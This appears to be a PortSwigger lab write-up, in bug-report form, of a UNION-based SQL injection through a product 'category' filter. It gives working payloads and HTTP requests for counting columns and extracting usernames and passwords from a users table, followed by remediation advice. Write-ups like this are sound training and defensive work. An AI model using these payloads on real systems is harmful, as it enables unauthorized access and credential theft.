
---
# SQL Injection in Product Filtering allows Retrieval of Data from Other Tables

## 1. Executive Summary

A SQL injection vulnerability exists in the product category filtering functionality, allowing an attacker to inject a `UNION SELECT` statement through the `category` parameter. Because the underlying query returns two text-compatible columns, an attacker can use the `UNION` operator to query the `users` table and retrieve usernames and passwords that are unrelated to the original product query.

## 2. Vulnerability Details

- **Vulnerability Type:** SQL Injection — UNION-based Data Extraction
    
- **Target Endpoint/URL:** `/filter`
    
- **Affected Parameter(s):** `category`
    
- **Authentication Level Required:** Unauthenticated
    

The application uses the user-controlled `category` parameter in a backend SQL query without properly parameterizing it.

A `UNION SELECT` attack can append a second query to the original query. For the `UNION` to succeed, the injected query must return the same number of columns as the original query, with compatible data types.

In this lab:

- The original query returns **2 columns**.
    
- Both columns accept **text data**.
    
- The `users` table contains `username` and `password` fields.
    

Therefore, the following payload can retrieve credentials:

```
'+UNION+SELECT+username,password+FROM+users--
```

## 3. Steps to Reproduce (STR)

### Step 1 — Intercept the request

1. Access the PortSwigger lab.
    
2. Navigate to the product listing page.
    
3. Select a product category.
    
4. Intercept the request using Burp Suite.
    
5. Locate the `category` parameter.
    

### Step 2 — Determine the column count and data types

6. Test the SQL injection point with a `UNION SELECT` payload containing two `NULL` values:
    

```
'+UNION+SELECT+NULL,NULL--
```

7. Observe that the request succeeds.
    
8. This confirms that the original query returns **two columns**.
    
9. Replace the first `NULL` with a known string:
    

```
'+UNION+SELECT+'abc',NULL--
```

10. Replace the second `NULL` with a known string:
    

```
'+UNION+SELECT+NULL,'def'--
```

11. Confirm that both columns accept text data.
    

Alternatively, the lab can confirm both columns at once using:

```
'+UNION+SELECT+'abc','def'--
```

12. Observe that both `abc` and `def` appear in the response.
    

### Step 3 — Retrieve data from the `users` table

13. Modify the `category` parameter to:
    

```
'+UNION+SELECT+username,password+FROM+users--
```

14. Send the request.
    
15. The injected query selects the `username` and `password` columns from the `users` table.
    
16. Observe that the application response now contains usernames and passwords.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

#### Confirm two text-compatible columns

```
GET /filter?category='+UNION+SELECT+'abc','def'-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

The injected SQL is conceptually:

```
SELECT ...
UNION
SELECT 'abc', 'def'
--';
```

The response contains:

```
abc
def
```

This confirms that the query returns two columns and both columns can contain text.

#### Retrieve usernames and passwords

```
GET /filter?category='+UNION+SELECT+username,password+FROM+users-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

The injected SQL is conceptually:

```
SELECT ...
UNION
SELECT username, password
FROM users
--';
```

The response contains data from the `users` table, for example:

```
administrator    <password>
user1            <password>
user2            <password>
```

The exact usernames and passwords depend on the lab instance.

### Evidence (Screenshots/Video)

- Screenshot showing the intercepted product category request.
    
- Screenshot showing the two-column `UNION SELECT` test.
    
- Screenshot showing `abc` and `def` in the response.
    
- Screenshot showing the `username,password` extraction payload.
    
- Screenshot showing usernames and passwords returned by the application.
    
- PortSwigger lab completion screen.
    

## 5. Impact Analysis

- **Technical Impact:** An unauthenticated attacker can use a `UNION SELECT` SQL injection to retrieve data from tables unrelated to the application's original product query. In this lab, the attacker can extract usernames and passwords from the `users` table.
    
- **Business Impact:** Unauthorized disclosure of user credentials can lead to account compromise and exposure of sensitive application data. If privileged accounts are present in the extracted data, an attacker may be able to obtain administrative access to the application.
    

## 6. Remediation & References

- **Suggested Fix:** Use parameterized queries/prepared statements so that user-controlled input is treated strictly as data and cannot modify the SQL query structure.
    

For example:

```
cursor.execute(
    "SELECT * FROM products WHERE category = %s",
    (category,)
)
```

Additional defenses include:

- Use prepared statements/parameterized queries.
    
- Never concatenate user-controlled input into SQL statements.
    
- Apply least-privilege permissions to the application's database account.
    
- Restrict the application's database user from accessing unnecessary tables.
    
- Store passwords using strong, salted password-hashing algorithms rather than plaintext.
    
- Avoid exposing database errors or query results to unauthorized users.
    
- Implement appropriate server-side input validation as defense in depth.
    

- **References:**
    
    - OWASP Top 10: A03 — Injection
        
    - OWASP SQL Injection Prevention Cheat Sheet
        
    - CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
        
    - PortSwigger Web Security Academy — SQL Injection UNION Attacks